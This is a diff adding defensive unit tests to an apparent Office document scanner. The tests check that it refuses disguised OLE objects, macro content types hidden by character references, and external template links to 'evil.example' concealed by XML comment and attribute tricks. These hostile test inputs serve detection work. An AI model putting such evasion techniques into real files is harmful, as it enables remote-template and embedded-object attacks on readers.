@@ -58,9 +58,54 @@ describe('OOXML embeddings', () => {
 
   it.each(['image1.png', 'image2.JPG', 'image3.jpeg', 'a.gif', 'b.bmp', 'c.emf', 'd.wmf', 'e.tif', 'f.tiff', 'g.svg'])(
     'allows a picture: %s', async (leaf) => {
-      expect(await code(inspectOffice(await docx([[`word/embeddings/${leaf}`, 'img']]), 'docx'))).toBe('ok');
+      const ext = leaf.slice(leaf.lastIndexOf('.') + 1);
+      const types = CT.replace('<Override', `<Default Extension="${ext}" ContentType="image/x-${ext.toLowerCase()}"/><Override`);
+      const file = await zipFile([
+        ['[Content_Types].xml', types], ['word/document.xml', '<w:document/>'], [`word/embeddings/${leaf}`, 'img'],
+      ]);
+      expect(await code(inspectOffice(file, 'docx'))).toBe('ok');
     },
   );
+
+  describe('an object behind a picture\'s name', () => {
+    const withTypes = (extra, entries) => zipFile([
+      ['[Content_Types].xml', CT.replace('<Override', `<Default Extension="png" ContentType="image/png"/>${extra}<Override`)],
+      ['word/document.xml', '<w:document/>'],
+      ...entries,
+    ]);
+    const OLE = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0]);
+
+    it('refuses a part typed as an OLE object', async () => {
+      const file = await withTypes('<Override PartName="/word/embeddings/object1.png" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
+        [['word/embeddings/object1.png', 'x']]);
+      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+    });
+
+    it('refuses a part with no picture type declared', async () => {
+      const file = await zipFile([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>'], ['word/embeddings/object1.png', 'x']]);
+      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+    });
+
+    it('refuses OLE or zip bytes under a picture type', async () => {
+      for (const bytes of [OLE, Buffer.from('PK\x03\x04rest', 'latin1')]) {
+        const file = await withTypes('', [['word/embeddings/object1.png', bytes]]);
+        expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+      }
+    });
+
+    it('refuses an oleObject or package relationship, wherever its target is', async () => {
+      for (const type of ['oleObject', 'package', 'control']) {
+        const file = await withTypes('', [['word/_rels/document.xml.rels',
+          `<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="media/image1.png"/></Relationships>`]]);
+        expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+      }
+    });
+
+    it('refuses a macro-enabled content type spelled with a character reference', async () => {
+      const file = await withTypes('<Default Extension="bin" ContentType="application/vnd.ms-office.vba&#80;roject"/>', []);
+      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+    });
+  });
 });
 
 describe('OOXML external relationships', () => {
@@ -98,6 +143,24 @@ describe('OOXML external relationships', () => {
     const odtUtf16 = Buffer.concat([Buffer.from([0xff, 0xfe]),
       Buffer.from('<office:document-content><text:a xlink:href="https://x">x</text:a></office:document-content>', 'utf16le')]);
     expect(await code(inspectOffice(await odt([], odtUtf16), 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+  });
+
+  it('is not fooled by a comment or another value that swallows the real attribute', async () => {
+    const tricks = [
+      '<Relationships><!-- ignored=" --><Relationship TargetMode="External" Id="r1" Target="https://evil.example/t.dotm"/></Relationships>',
+      '<Relationships><Relationship Id="r1" Note="a TargetMode=\'Internal\'" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>',
+    ];
+    for (const xml of tricks) {
+      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
+    }
+  });
+
+  it('refuses a DTD and malformed XML rather than guessing', async () => {
+    const dtd = '<!DOCTYPE r [<!ENTITY e "External">]><Relationships><Relationship Id="r1" Target="x" TargetMode="&e;"/></Relationships>';
+    const broken = '<Relationships><Relationship Id="r1" Target="<x" TargetMode="External"/></Relationships>';
+    for (const xml of [dtd, broken]) {
+      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_NOT_VALID');
+    }
   });
 
   it('allows internal relationships', async () => {
